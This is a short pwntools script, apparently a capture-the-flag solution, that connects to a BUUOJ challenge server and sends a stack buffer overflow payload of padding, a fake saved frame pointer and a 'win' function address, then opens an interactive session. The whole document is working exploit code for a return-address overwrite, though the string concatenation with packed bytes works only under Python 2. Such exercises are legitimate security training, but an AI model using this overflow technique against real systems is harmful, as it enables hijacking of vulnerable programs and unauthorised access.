from pwn import *

io = remote("node4.buuoj.cn", 27436)

win = 0x80485CB
payload = "a" * 40 + p32(0) + p32(win)
io.sendline(payload)

io.interactive()